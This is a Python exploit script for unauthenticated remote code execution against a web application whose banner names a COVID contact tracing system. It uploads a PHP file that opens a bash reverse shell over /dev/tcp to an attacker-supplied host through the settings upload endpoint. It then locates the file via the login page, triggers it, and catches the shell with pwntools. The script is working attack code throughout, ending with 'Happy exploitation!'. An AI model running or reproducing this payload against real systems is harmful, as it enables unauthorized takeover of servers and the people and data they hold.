#!/usr/bin/python3

# Libraries to use
import random, requests, sys
from bs4 import BeautifulSoup
from requests_toolbelt.multipart.encoder import MultipartEncoder
from threading import Thread
from pwn import * 

# reference exploit: https://www.exploit-db.com/exploits/49604

def banner():
    print(""""
____ ____ _  _ _ ___    ____ ____ _  _ ___ ____ ____ ___ 
|    |  | |  | | |  \   |    |  | |\ |  |  |__| |     |  
|___ |__|  \/  | |__/   |___ |__| | \|  |  |  | |___  |  
___ ____ ____ ____ _ _  _ ____   ____ _   _ ____ ___ ____ _  _ 
 |  |__/ |__| |    | |\ | | __   [__   \_/  [__   |  |___ |\/| 
 |  |  \ |  | |___ | | \| |__]   ___]   |   ___]  |  |___ |  | 1.0

[!] Vuln: Remote Code Execution (Unauthenticated)
""")


# Uploading the reverse shell into the server
def uploading_revshell(target_ip, attacker_ip, attacker_port):

    # Creating the payload
    random_filename = str(random.randint(00000,99999)) + "rev-shell.php"
    revshell = f"/bin/bash -c '/bin/bash -i &>/dev/tcp/{attacker_ip}/{attacker_port} <&1 2>/dev/null'"
    revshell_payload = f'<?php system("{revshell}"); ?>'

    header_payload = MultipartEncoder(
        fields={
            'name': 'hacked', 
            'img': (random_filename, revshell_payload, 'application/x-php')
        })
        
    print("[+] uploading rev-shell..")

    # Sending the payload
    req = requests.post(
        url=f'http://{target_ip}/classes/SystemSettings.php?f=update_settings', 
        data=header_payload, 
        headers={'Content-Type': header_payload.content_type}
    )

    if req.text == '1':
        print("[+] rev-shell has been uploaded succesfully!")
    else:
        print("[-] Error: something was wrong uploading the file!")
        sys.exit(2)


# Requesting the reverse shell to execute it
def getting_revshell_path(target_ip):
    print("[+] requesting the rev-shell")

    # Getting rev-shell path
    req = requests.get(f'http://{target_ip}/login.php')

    soup = BeautifulSoup(req.text, 'lxml')
    images = soup.find_all('img')
    for img in images: 
        return img['src']

# Executing revshell
def executing_revshell(target_ip, path_revshell):
    requests.get(f'http://{target_ip}/{path_revshell}')


# Main program
if __name__ == "__main__":

    banner()

    if len(sys.argv) != 4:
        print(f'[*] Use: {sys.argv[0]} <attacker-ip> <attacker-port> <target ip>')
        print(f'[*] Example:\n')
        print(f'\t$ python3 {sys.argv[0]} 10.4.37.100 443 10.0.0.1')
        print('\n~ Happy exploitation!')
        sys.exit(1)

    attacker_ip = sys.argv[1]
    attacker_port = sys.argv[2]
    target_ip = sys.argv[3]
    
    uploading_revshell(target_ip, attacker_ip, attacker_port)

    path_revshell = getting_revshell_path(target_ip)
    print(f'[+] revshell in: http://{target_ip}/{path_revshell}')


    try:
        Thread(target=executing_revshell, args=(target_ip, path_revshell)).start()
    except:
        print('Error: something was wrong!')
        sys.exit(2)

    # Listening and waiting for connection
    shell = listen(attacker_port, timeout=20).wait_for_connection()
    shell.sendline(b'echo -e "~ User: $(whoami)"')
    shell.interactive()
